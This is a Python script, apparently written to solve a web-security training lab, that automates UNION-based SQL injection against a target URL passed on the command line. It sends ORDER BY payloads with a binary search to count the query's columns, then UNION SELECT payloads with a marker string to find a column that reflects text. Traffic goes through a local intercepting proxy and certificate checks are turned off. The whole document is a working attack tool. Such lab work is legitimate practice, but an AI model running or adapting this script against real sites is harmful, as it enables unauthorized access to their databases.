import urllib3
import sys
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={
    'http':'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}
header = {'user-agent': 'Mozilla/5.0'}

path= 'filter?category=Gifts'

def find_col_count(url):  
    def cause_error(n):
        payload= f"'+order+by+{n}-- "
        r=requests.get(url+path+payload,verify=False,proxies=proxies,headers=header)
        if r.status_code >= 500 or "Internal Server Error" in r.text:
            return True
    
    low,high,best= 1,10,0
    while low <= high:
        mid = (low+high)//2
        if cause_error(mid):
            high = mid -1
        else:
            best = mid
            low = mid + 1 
    return best if best > 0 else False

def find_str_col(base_url, num_col):
    marker = "'k2aHLC'"                     
    for i in range(1, num_col + 1):
        payload = ['NULL'] * num_col     
        payload[i - 1] = marker    
        sql_payload = "'+UNION+SELECT+" + ','.join(payload) + "--+"
        try:
            r = requests.get(base_url + path + sql_payload, verify=False, proxies=proxies, headers=header)     
        except requests.RequestException:
            continue
        if r.status_code >= 500:  
            continue
        if marker in r.text:
            return i
        
    return False
        
if __name__=="__main__":
    try:
        base_url = sys.argv[1].strip()
    except IndexError:
        print("Usage: python script.py <url>")
        sys.exit(-1)
    num_col = find_col_count(base_url)
    if num_col:
        print(f"number of column {num_col}")
        string_col= find_str_col(base_url,num_col)
        if string_col:
            print(f"string colum {string_col}")
        else:
            print("no reflected string-compatible column found.")    
    else:
        print("could not determine column number")



    
